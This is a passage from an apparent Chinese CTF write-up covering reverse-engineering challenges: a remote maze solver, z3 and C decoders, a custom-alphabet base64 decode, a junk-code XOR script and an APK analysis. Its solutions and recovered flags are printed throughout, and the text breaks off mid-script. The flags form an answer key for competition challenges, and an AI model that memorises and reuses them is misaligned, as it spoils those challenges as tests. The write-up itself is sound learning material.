class="number">0</span>, <span class="number">1</span>], [-<span class="number">1</span>, <span class="number">0</span>]]</span><br><span class="line">way = <span class="string">&quot;SADW&quot;</span></span><br><span class="line">back = &#123;<span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putstr</span>(<span class="params">a</span>):</span></span><br><span class="line">    ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        ans += i</span><br><span class="line">    print(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">x, y, step</span>):</span></span><br><span class="line">    putstr(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        xnew = x + <span class="built_in">next</span>[i][<span class="number">0</span>]</span><br><span class="line">        ynew = y + <span class="built_in">next</span>[i][<span class="number">1</span>]</span><br><span class="line">        flag[step] = way[i]</span><br><span class="line">        flag[step+<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (maze[xnew][ynew] == <span class="number">1</span> <span class="keyword">or</span> mark[xnew][ynew]==<span class="number">1</span>):<span class="comment">#如果该方向为墙或者已经走过，直接下一轮循环。</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        io.sendline(way[i])<span class="comment">#发送当前循环的方向</span></span><br><span class="line">        ans = io.readline()<span class="comment">#得到反馈字符串</span></span><br><span class="line">        <span class="keyword">if</span> (ans == <span class="string">b&#x27;1\n&#x27;</span>):<span class="comment">#如果是正确方向</span></span><br><span class="line">            maze[xnew][ynew] = <span class="number">0</span></span><br><span class="line">            mark[x][y] = <span class="number">1</span><span class="comment">#标记旧位置，防止回走</span></span><br><span class="line">            dfs(xnew, ynew, step + <span class="number">1</span>)</span><br><span class="line">            io.sendline(back[way[i]])<span class="comment">#如果该路尽头走不通，开始回走，直到找到有多个方向的那个节点。因为迷宫可能有多条路线，某些路线是错的，而且这个程序走错是不会改变位置的，回走就会改变位置，所以回走时要反方向sendline</span></span><br><span class="line">            io.readline()<span class="comment">#将回走的反馈接收</span></span><br><span class="line">            mark[x][y] = <span class="number">0</span><span class="comment">#重新标记为0</span></span><br><span class="line">        <span class="keyword">elif</span>(ans[<span class="number">0</span>:<span class="number">4</span>]==<span class="string">b&quot;Good&quot;</span>):<span class="comment">#终点判定</span></span><br><span class="line">            print(<span class="string">&quot;success&quot;</span>,end=<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">            putstr(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            maze[xnew][ynew] = <span class="number">1</span><span class="comment">#将该方向判定为墙</span></span><br><span class="line"></span><br><span class="line">maze = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]<span class="comment">#初始化迷宫地图</span></span><br><span class="line">mark = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>)]<span class="comment">#初始化走过的地方，注意这只是一条路线，不包括错误路线，若想要知道所有走过的地方，可再添加一个二维数组。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;This is the beginning. You can only go south.\n&quot;</span>)</span><br><span class="line">dfs(<span class="number">3</span>, <span class="number">3</span>, <span class="number">0</span>)<span class="comment">#避免边界，可以从偏中间的位置开始，只不过出题人也考虑了的，从左上开始走是没有问题的。</span></span><br></pre></td></tr></table></figure><h2 id="极客巅峰-so-get"><a href="#极客巅峰-so-get" class="headerlink" title="极客巅峰 so get"></a>极客巅峰 so get</h2><p>一道web&amp;re，当时队友getshell后的文件没给对，哈哈，后面看师傅的wp才知道是哪几个文件，看来得学点web了。。。大概就是用aes加密了php文件，这种加密php，记得一个老师傅还做过讲解。</p><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy re"></a>easy re</h2><p>ida看看逻辑，就是基础的操作<br><img src="https://i.loli.net/2021/08/02/lFs8yfMVXJcvCj2.png"><br>z3来解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">code=[  <span class="number">0x1B</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x5F</span>, <span class="number">0x34</span>, <span class="number">0x1B</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>,</span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0x04</span>, <span class="number">0x32</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>]</span><br><span class="line">tmp=[<span class="number">1</span>]*<span class="number">17</span></span><br><span class="line"><span class="built_in">len</span>=<span class="built_in">len</span>(code)</span><br><span class="line"><span class="comment">#101 01110  010 11011  110 10001</span></span><br><span class="line"><span class="comment">#010 01110  110 11011  101 10001</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    tmp[i]=flag[(i + <span class="number">1</span>) % <span class="built_in">len</span>] &amp; <span class="number">0xE0</span> | flag[i % <span class="built_in">len</span>] &amp; <span class="number">0x1F</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    tmp[j] = tmp[(j + <span class="number">1</span>) % <span class="built_in">len</span>] ^ tmp[j % <span class="built_in">len</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">    s.add(tmp[i]==code[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">     model = s.model()</span><br><span class="line">     <span class="built_in">str</span> = [<span class="built_in">chr</span>(model[flag[i]].as_long().real) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>)]</span><br><span class="line">     print(<span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>))</span><br><span class="line">     exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">     print(<span class="string">&quot;no_sat&quot;</span>)</span><br><span class="line"><span class="comment">#D_GO0d_Re_s0_EasY</span></span><br></pre></td></tr></table></figure><p>c语言</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[]=&#123;<span class="number">0x1B</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x5F</span>, <span class="number">0x34</span>, <span class="number">0x1B</span>, <span class="number">0x2D</span>, <span class="number">0x37</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>,</span><br><span class="line">   <span class="number">0x63</span>, <span class="number">0x0F</span>, <span class="number">0x3A</span>, <span class="number">0x04</span>, <span class="number">0x32</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>&#125;;</span><br><span class="line">   <span class="keyword">char</span> tmp;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">16</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=a[i]^a[(i+<span class="number">1</span>)%<span class="number">17</span>];</span><br><span class="line">&#125;</span><br><span class="line">tmp=a[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">16</span>;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=a[(i<span class="number">-1</span>)]&amp;<span class="number">0xE0</span> | a[i]&amp; <span class="number">0x1F</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>]=a[<span class="number">0</span>]&amp; <span class="number">0x1F</span>|tmp&amp;<span class="number">0xE0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">17</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//D_GO0d_Re_s0_EasY</span></span><br></pre></td></tr></table></figure><h2 id="basebase"><a href="#basebase" class="headerlink" title="basebase"></a>basebase</h2><p>签到题，变表base</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">str1 =<span class="string">&#x27;h31DcTJ2d3d5nPoQnSAAnQBel4lihldkikV78nQ=&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">print(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1, string2))))</span><br><span class="line"><span class="comment">#D0g3&#123;B43E_64_i$_INTERESTING!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="junkcode"><a href="#junkcode" class="headerlink" title="junkcode"></a>junkcode</h2><p>这道题，出题人插入了一些汇编，影响了程序逻辑，f5的逻辑是错的，直接撸汇编，看加密过程。<br><img src="https://i.loli.net/2021/08/02/ILgvHP4QiYu5X9t.png"><br>写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">a=[  <span class="number">0x25</span>, <span class="number">0x4C</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x1E</span>, <span class="number">0x0E</span>, <span class="number">0x22</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x2C</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x23</span>, <span class="number">0x2C</span>, <span class="number">0x5D</span>, <span class="number">0xE2</span>, <span class="number">0xCD</span>, <span class="number">0xC4</span>, <span class="number">0xDB</span>,</span><br><span class="line">  <span class="number">0xC2</span>, <span class="number">0xDB</span>, <span class="number">0x93</span>, <span class="number">0xB3</span>, <span class="number">0xF0</span>, <span class="number">0xF7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>((((<span class="built_in">ord</span>(s[i])+i))^a[i])+i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">D0g3&#123;jUnk_c0de_1s_So_e4Sy&#125;</span><br></pre></td></tr></table></figure><h2 id="funny"><a href="#funny" class="headerlink" title="funny"></a>funny</h2><p>apk，jeb打不开，不知道是不是设置了什么，但是可以通过分析解压后的class.dex来看加密逻辑，发现是flag先异或后bit位操作，然后加上md5加密flag组成的字符串。</p><p><img src="https://i.loli.net/2021/08/02/anfMUhVzXGpSv6s.png"><br>解包指令<code>java -jar .\apktool_2.3.0.jar d .\app-debug.apk -o QKSword</code>，查看id发现，对应名称为v，然后找到字符串v=”vNIfOQtJIkznEF7117D32B97D82C0607A3A06E7C78C6”</p><p>再来看加密函数<br><img src="https://i.loli.net/2021/08/02/z6aKPi7SANWV4RZ.png"><br>了解了加密函数后，通过密文可知道flag有12位，格式又是D0g3{}，如果采用爆破来解的话就只用爆破6个字符。但是由于之前做的时候没意识到那个表有多义性，用z3试了试，没解出来，后来发现有多义性后，懒得写md5爆破，就将就了z3，一个一个字符爆嘛，没爆出来就换下表里面的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#D0g3&#123;&#125;</span></span><br><span class="line">code=<span class="string">&#x27;vNIfOQtJIkzn&#x27;</span></span><br><span class="line">xor=[<span class="number">45</span>, <span class="number">13</span>, <span class="number">55</span>, <span class="number">71</span>, <span class="number">94</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">71</span>, <span class="number">11</span>, <span class="number">54</span>, <span class="number">0x76</span>, <span class="number">93</span>]</span><br><span class="line">code1=[<span class="number">116</span>,<span class="number">94</span>,<span class="number">40</span>,<span class="number">58</span>,<span class="number">82</span>,<span class="number">33</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">40</span>,<span class="number">59</span>,<span class="number">114</span>,<span class="number">101</span>]<span class="comment">#最后发现这个表是对的。</span></span><br><span class="line">table=[<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;K&#x27;</span>]</span><br><span class="line">tmp=[<span class="number">0</span>]*<span class="number">12</span></span><br><span class="line"><span class="built_in">len</span>=<span class="built_in">len</span>(xor)</span><br><span class="line"><span class="comment"># for i in range(12):</span></span><br><span class="line"><span class="comment">#     print(i,end=&#x27;: &#x27;)</span></span><br><span class="line"><span class="comment">#     for j in range(256):</span></span><br><span class="line"><span class="comment">#         if(code[i]==table[j]):</span></span><br><span class="line"><span class="comment">#             print(j,end=&#x27;,&#x27;)</span></span><br><span class="line"><span class="comment">#     print(end=&#x27; &#x27;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># tab=&#x27;0: 115,116,191, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;1: 94,133,186,202,236, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;2: 40,128,142,146,250, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;3: 58,249, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;4: 82,150,158,171,254, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;5: 2,33,197,223, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;6: 26,64,180, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;7: 18,108,140,193,199,216, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;8: 40,128,142,146,250, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;9: 59,141,143,145,155,187,196,228, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;10: 8,67,95,114,164,210, &#x27; \</span></span><br><span class="line"><span class="comment">#     &#x27;11: 23,55,76,83,101,159, 80&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]<span class="comment">#手动从0~12，满足输出字符是比较舒服的字符就行。</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    tmp[i]=(flag[i]^xor[i % <span class="built_in">len</span>])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="keyword">for</span> i 